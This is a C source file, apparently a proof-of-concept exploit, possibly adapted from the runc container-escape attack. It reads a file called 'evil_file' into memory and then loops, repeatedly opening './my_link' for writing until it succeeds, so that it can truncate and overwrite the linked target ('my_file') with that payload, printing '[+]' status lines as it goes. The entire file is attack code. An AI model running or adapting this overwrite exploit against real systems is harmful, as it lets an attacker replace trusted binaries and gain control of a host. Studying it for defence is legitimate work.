#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* Simple Buffer*/
typedef struct Buffer
{
	int len;		// buffer length
	void * buff;	// buffer data
} Buffer;

#define FALSE 0
#define TRUE  1



const char * EVIL_FILE_PATH = "./evil_file";

const unsigned int PATH_MAX_LEN = 30;

const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_evil_file(char * evil_file_path);


/*
* Overwrites the my_file binary.
*/
int main(int argc, char *argv[])
{
	int runc_fd_read, my_file_fd, wc;
	char my_file_path[PATH_MAX_LEN];
	char * evil_file_path;                    	 // path to file to replace my_file
	char * runc_exe_path;
	Buffer evil_file;


	/* Read evil_file */
    evil_file_path = EVIL_FILE_PATH;

	evil_file = read_evil_file(evil_file_path);
	
	printf("[+] Read %d bytes from evil_file\n", evil_file.len);

	/* Try to open /my_file for writing */
	sprintf(my_file_path, "./my_link");
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		my_file_fd = open(my_file_path, O_WRONLY | O_TRUNC);
		if (my_file_fd != OPEN_ERR)
		{
			wc = write(my_file_fd, evil_file.buff, evil_file.len);
			if (wc !=  evil_file.len)
			{
				printf("[!] Couldn't write to my my_file's fd %s\n", my_file_path);
				close(my_file_fd);
				free(evil_file.buff);
				return RET_ERR;
			}
			printf("[+] Opened my_file (using %s) for writing\n", my_file_path);
			printf("[+] Succesfully overwritten my_file\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(my_file_fd);
	free(evil_file.buff);
	if (opened == FALSE)
	{
		printf("[!] Reached timeout, couldn't write to my_file at %s\n", my_file_path);
		return RET_ERR;
	}
	else
		printf("[+] Done, shuting down ...\n");

	fflush(stdout);
	return RET_OK;

}





Buffer read_evil_file(char * evil_file_path)
{
	Buffer evil_file = {0, NULL};
	FILE *fp_evil_file;
	int file_size, rc;
	void * evil_file_content;
	char ch;

	// open evil_file
	fp_evil_file = fopen(evil_file_path, "r"); // read mode
	if (fp_evil_file == NULL)
	{
	  printf("[!] open file err while opening the evil_file %s\n", evil_file_path);
	  return evil_file;
	}

	// Get file size and prepare buff
	fseek(fp_evil_file, 0L, SEEK_END);
	file_size = ftell(fp_evil_file);
	evil_file_content = malloc(file_size);
	rewind(fp_evil_file);

	rc = fread(evil_file_content, 1, file_size, fp_evil_file);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from evil_file at %s\n", evil_file_path);
		free(evil_file_content);
		return evil_file;
	}

	fclose(fp_evil_file);
	evil_file.len = rc;
	evil_file.buff = evil_file_content;
	return evil_file;

}